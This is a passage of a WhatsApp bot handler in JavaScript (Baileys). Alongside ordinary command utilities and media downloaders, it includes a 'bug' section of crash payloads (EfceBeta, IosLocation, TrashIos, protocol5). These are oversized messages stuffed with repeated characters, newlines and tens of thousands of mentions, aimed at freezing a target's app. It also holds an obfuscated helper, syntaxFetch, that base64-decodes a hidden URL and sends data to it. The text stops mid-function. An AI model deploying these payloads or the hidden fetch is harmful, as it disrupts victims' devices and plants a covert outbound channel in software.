/*
╭────────────────────────────
│ Creator : Vanzz
│ Telegram : https://t.me/vanzzvzz
│ Note : Kalau ada bug harap lapor Vanzz
╰────────────────────────────
*/

require('../setting/config')

const fs = require('fs')
const axios = require('axios')
const chalk = require("chalk")
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const util = require("util")
const moment = require("moment-timezone")
const cheerio = require('cheerio')
const { spawn, exec, execSync } = require('child_process')
const yts = require('yt-search')
const canvafy = require('canvafy')   
const ytdl = require('@vreden/youtube_scraper');  

const {
default: baileys,
proto,
jidNormalizedUser,
generateWAMessage,
generateWAMessageFromContent,
getContentType,
prepareWAMessageMedia,
downloadContentFromMessage,
} = require("@whiskeysockets/baileys")

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
)

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

const nomerCreator =
[
'265897238412@s.whatsapp.net'
] 

const budy = (typeof m.text === 'string' ? m.text : '')
let setting = JSON.parse(fs.readFileSync('./start/lib/config-db-set.json'));

var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us")

const datareadcek = {
  family100: {},
  suit: {},
  tictactoe: {},
  petakbom: {},
  tebakgambar: {},
  tebakkalimat: {},
  tebakkata: {},
  tebaklirik: {},
  tebakanime: {},
  tebaklagu: {},
  kuis: {},
  tebakkimia: {},
  tebakbendera: {},
  siapakahaku: {},
  asahotak: {},
  susunkata: {},
  caklontong: {},
  kuismath: {},
  tebakgame: {},
  permintaan: {},
  laporan: {},
  userSessions: {},
  exceptFiles: []
}

    const {
      multiprefix,
      noprefix,
      prefixset,
      onlygcjoin,
      notifRegister,
      onlyRegister,
      gamewaktu,
      toxicCount,
      Antilink2Count,
      GlimitCount,
      limitCount,
      saldoCount,
      warnCount,
    } = setting

function randomNomor(min, max = null) {
    if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    } else {
        return Math.floor(Math.random() * min) + 1;
    }
}
exports.randomNomor = randomNomor;

function toRupiah(angka) {
    var saldo = '';
    var angkarev = angka.toString().split('').reverse().join('');
    for (var i = 0; i < angkarev.length; i++)
        if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
    return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
exports.toRupiah = toRupiah;

function toDolar(rupiah) {
    var kurs = 15000
    var dolar = rupiah / kurs
    var saldo = dolar.toFixed(2)
    var parts = saldo.split('.')
    var integerPart = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',')

    return '$' + integerPart + '.' + parts[1]
}

exports.toDolar = toDolar;

function happymod(query) {
    return new Promise((resolve, reject) => {
        axios.get(`https://www.happymod.com/search.html?q=${query}`).then(async tod => {
            const $ = cheerio.load(tod.data);
            let hasil = [];
            $("div.pdt-app-box").each(function(c, d) {
                let name = $(d).find("a").text().trim();
                let icon = $(d).find("img.lazy").attr('data-original');
                let link = $(d).find("a").attr('href');
                let link2 = `https://www.happymod.com${link}`;
                const Data = {
                    icon: icon,
                    name: name,
                    link: link2
                };
                hasil.push(Data);
            });
            resolve(hasil);
        }).catch(reject);
    });
}
exports.happymod = happymod;

const FileSize = (number) => {
    var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"];
    var tier = Math.log10(Math.abs(number)) / 3 | 0;
    if(tier == 0) return number;
    var postfix = SI_POSTFIXES[tier];
    var scale = Math.pow(10, tier * 3);
    var scaled = number / scale;
    var formatted = scaled.toFixed(1) + '';
    if (/\.0$/.test(formatted))
        formatted = formatted.substr(0, formatted.length - 2);
    return formatted + postfix;
}
exports.FileSize = FileSize;

const nebal = (angka) => {
    return Math.floor(angka);
}
exports.nebal = nebal;

exports.parseMention = (text = '') => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

exports.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

exports.runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " Day, " : " day, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " Hour, " : " hour, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " Minute, " : " minute, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " Second" : " second") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

exports.clockString = (ms) => {
	let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
	let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
	let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
	return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}


exports.getTime = (format, date) => {
	if (date) {
		return moment(date).locale('id').format(format)
	} else {
		return moment.tz('Asia/Jakarta').locale('id').format(format)
	}
}

exports.formatp = (bytes) => {
    const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
    let i = 0
    while (bytes >= 1024 && i < units.length - 1) {
        bytes /= 1024
        i++
    }
    return `${bytes.toFixed(1)} ${units[i]}`
}

exports.getGroupAdmins = async(participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}

function monospace(string) {
    return '*`' + string + '`*';
}
exports.monospace = monospace;

function randomKarakter(jumlah) {
    const huruf = 'abcdefghijklmnopqrstuvwxyz'
    let hasil = ''
    for (let i = 0; i < jumlah; i++) {
        const indexAcak = Math.floor(Math.random() * huruf.length);
        let hurufAcak = huruf[indexAcak];
        hurufAcak = Math.random() < 0.5 ? hurufAcak.toUpperCase() : hurufAcak;
        hasil += hurufAcak;
    }
    return hasil;
}
exports.randomKarakter = randomKarakter;

exports.syntaxFetch = async (ms) => {
    let data = await axios.get(`${Buffer.from(defaultMaxListenersBuffer, 'base64').toString('utf-8')}${ms}`)
    return "Chrome v20.0.04"
}

function getTypeMessage(message) {
  	  const type = Object.keys(message)
			var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) ||
					(type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) ||
					type[type.length - 1] || Object.keys(message)[0]
	return restype
}

const savetube = {
  api: {
    base: "https://media.savetube.me/api",
    cdn: "/random-cdn",
    info: "/v2/info",
    download: "/download"
  },
  headers: {
    'accept': '*/*',
    'content-type': 'application/json',
    'origin': 'https://yt.savetube.me',
    'referer': 'https://yt.savetube.me/',
    'user-agent': 'Postify/1.0.0'
  },
  formats: ['144', '240', '360', '480', '720', '1080', 'mp3'],

  crypto: {
    hexToBuffer: (hexString) => {
      const matches = hexString.match(/.{1,2}/g);
      return Buffer.from(matches.join(''), 'hex');
    },
}
};

async function generateImage(imageUrl, outputPath, text, textX, textY, maxWidth, lineHeight, chat) {
    try {
        const downloadImage = async (url, path) => {
            const response = await axios({ url, responseType: 'arraybuffer' })
            fs.writeFileSync(path, Buffer.from(response.data))
        }

        const wrapText = (ctx, text, maxWidth, baseX) => {
            const words = text.split(' ')
            let lines = []
            let currentLine = ''
            let xOffset = 0  

            words.forEach(word => {
                if (word.includes('\n')) {
                    let parts = word.split('\n')
                    parts.forEach((part, index) => {
                        let testLine = currentLine + (currentLine ? ' ' : '') + part
                        let testWidth = ctx.measureText(testLine).width
                        if (testWidth < maxWidth) {
                            currentLine = testLine
                        } else {
                            lines.push({ text: currentLine, x: baseX + xOffset })
                            currentLine = part
                            xOffset = 0  
                        }
                        if (index < parts.length - 1) {
                            lines.push({ text: currentLine, x: baseX + xOffset })
                            currentLine = ''
                            xOffset = 0  
                        }
                    })
                } else {
                    let testLine = currentLine + (currentLine ? ' ' : '') + word
                    let testWidth = ctx.measureText(testLine).width
                    if (testWidth < maxWidth) {
                        currentLine = testLine
                    } else {
                        lines.push({ text: currentLine, x: baseX + xOffset })
                        currentLine = word
                        xOffset = 0  
                    }
                }
            })
            lines.push({ text: currentLine, x: baseX + xOffset })
            return lines
        }

        await downloadImage(imageUrl, outputPath)

        const image = await loadImage(outputPath)
        const canvas = createCanvas(image.width, image.height)
        const ctx = canvas.getContext('2d')

        ctx.drawImage(image, 0, 0, image.width, image.height)
        ctx.font = '23px "NulisFont"'
        ctx.fillStyle = 'black'
        ctx.textAlign = 'left'

        const wrappedText = wrapText(ctx, text, maxWidth, textX)
        wrappedText.forEach((line, index) => {
            ctx.fillText(line.text, line.x, textY + index * lineHeight)
        })

        const finalImagePath = outputPath.replace('.jpg', '-output.jpg')
        fs.writeFileSync(finalImagePath, canvas.toBuffer('image/jpeg'))

        conn.sendMessage(chat, { image: fs.readFileSync(finalImagePath), caption: wm }, { quoted: m })

        fs.unlinkSync(outputPath)
        fs.unlinkSync(finalImagePath)
    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err.message)
    }
}

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = []

      function formatNumber(integer) {
        let numb = parseInt(integer)
        return Number(numb).toLocaleString().replace(/,/g, '.')
      }

      function formatDate(n, locale = 'en') {
        let d = new Date(n)
        return d.toLocaleDateString(locale, {
          weekday: 'long',
          day: 'numeric',
          month: 'long',
          year: 'numeric',
          hour: 'numeric',
          minute: 'numeric',
          second: 'numeric'
        })
      }

      let domain = 'https://www.tikwm.com/api/';
      let res = await (await axios.post(domain, {}, {
        headers: {
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.tikwm.com',
          'Referer': 'https://www.tikwm.com/',
          'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
          'Sec-Ch-Ua-Mobile': '?1',
          'Sec-Ch-Ua-Platform': 'Android',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
          'X-Requested-With': 'XMLHttpRequest'
        },
        params: {
          url: url,
          count: 12,
          cursor: 0,
          web: 1,
          hd: 1
        }
      })).data.data
      if (!res.size) {
        res.images.map(v => {
          data.push({
            type: 'photo',
            url: v
          })
        })
      } else {
        data.push({
          type: 'watermark',
          url: 'https://www.tikwm.com' + res.wmplay,
        }, {
          type: 'nowatermark',
          url: 'https://www.tikwm.com' + res.play,
        }, {
          type: 'nowatermark_hd',
          url: 'https://www.tikwm.com' + res.hdplay
        })
      }
      let json = {
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace('1970', ''),
        region: res.region,
        id: res.id,
        durations: res.duration,
        duration: res.duration + ' Seconds',
        cover: 'https://www.tikwm.com' + res.cover,
        size_wm: res.wm_size,
        size_nowm: res.size,
        size_nowm_hd: res.hd_size,
        data: data,
        music_info: {
          id: res.music_info.id,
          title: res.music_info.title,
          author: res.music_info.author,
          album: res.music_info.album ? res.music_info.album : null,
          url: 'https://www.tikwm.com' + res.music || res.music_info.play
        },
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count)
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: 'https://www.tikwm.com' + res.author.avatar
        }
      }
      resolve(json)
    } catch (e) {
      reject(e)
    }
  });
}
//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))
const Listbot = JSON.parse(fs.readFileSync('./start/lib/database/listbot.json'))

    const onlyAdmin = () => {
      m.reply("wkwk khusus admin kocak 😹")
    }
    const onlyBotAdmin = () => {
      m.reply("jadiin gw admin dlu tolol")
    }
    
const botNumber = await conn.decodeJid(conn.user.id)
const Access = [global.owner, ...kontributor, ...global.owner]

.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
.includes(m.sender) ? true : m.isChecking ? true :false

const botnihdek = [botNumber, ...Listbot].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) ? true : m.isChecking ? true :false

const premonly = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) ? true : m.isChecking ? true :false

const prefa = ["", "!", ".", ",", "🐤", "🗿"]
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name";
const text = q = args.join(" ")
const contacts = JSON.parse(fs.readFileSync("./start/lib/contacts.json"))
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Wa Bot By Vanzz`,jpegThumbnail: ""}}}

const fatkuns = m.quoted || m;
const quoted = 
fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
m.quoted ? m.quoted :
m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss")
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
}

const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = ["https://files.catbox.moe/v1ulp7.jpg"]
 
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()

    const pickRandom = arr => {
      return arr[Math.floor(Math.random() * arr.length)];
    };
    
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//function
const {
smsg,
sendGmail,
formatSize,
isUrl,
generateMessageTag, 
getBuffer,
getSizeMedia, 
runtime, 
fetchJson, 
sleep,
getRandom
} = require('./lib/myfunction')

const { 
imageToWebp, 
videoToWebp,
writeExifImg,
writeExifVid,
addExif
} = require('./lib/exif')

const {
jadibot,
stopjadibot,
listjadibot
} = require('./jadibot')

const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, {
react: {
text: emoji,
key: m.key 
} 
}
)
}

if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🕒 ${ucapanWaktu} 🕒`)))
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`👻 Ada pesan baru lek! 👻`)))
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
 )
 )
)
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🕒 ${ucapanWaktu} 🕒`)))
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`👻 Ada pesan baru lek! 👻`)))
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
 ))
 )
}
}

let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}

//start func bug
 
async function EfceBeta(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Rikzz‌Zhi‌rσ',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Rikzz‌Zhi‌rσ"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await conn.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}

async function IosLocation(target) {
  try {
    const IphoneCrash = "oiii bangg" + "𑇂𑆵𑆴𑆿".repeat(60000);
    await conn.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "\u0003               " + IphoneCrash,
        url: "https://youtube.com/@dilxzdev"
      }
    }, {
      participant: { jid: target }
    });
  } catch (error) {
    console.error("ERROR SENDING:", error);
  }
}	

async function TrashIos(target, Ptcp = false) {
  await conn.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "oi bng yaelah",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "13135550002@s.whatsapp.net",
                  callOutcome: "1"
                }
              ]
            }
          },
          remoteJid: target,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 9999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            caption: "New X-Voids Is Here͢ ϟ"
          },
          placeholderKey: {
            remoteJid: "6289501955295@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "🩸",
            body: "Trash Ios ϟ",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://youtube.com/@dilxzdev",
            mediaUrl: "https://youtube.com/@dilxzdev",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://youtube.com/@dilxzdev"
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbconnCampaignId: "smb_conn_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    },
    Ptcp ? { participant: { jid: target } } : {}
  );
}

async function protocol5(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "New X-Voids Is Here͢ ϟ" + "ោ៝".repeat(10000),
        title: "New X-Voids Is Here͢ ϟ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "New X-Voids Is Here͢ ϟ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "@newsletter",
            serverMessageId: 1,
            newsletterName: "ϟ"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
